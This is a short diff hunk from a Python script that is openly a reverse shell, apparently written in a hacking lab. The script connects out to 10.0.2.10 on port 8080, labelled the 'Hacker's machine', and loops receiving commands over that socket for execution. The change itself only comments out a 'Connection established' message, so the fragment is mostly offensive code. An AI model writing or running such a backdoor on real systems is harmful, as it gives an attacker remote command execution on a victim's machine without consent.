@@ -9,7 +9,7 @@ def command_execution(command):
 connection = socket(AF_INET, SOCK_STREAM)
 connection.connect(("10.0.2.10", 8080))  # Connect to Hacker's machine
 
-connection.send(b"Connection established\n")
+# connection.send(b"Connection established...\n")
 
 while True: # Create infinite loop of execution of commands
     command = connection.recv(1024).decode()
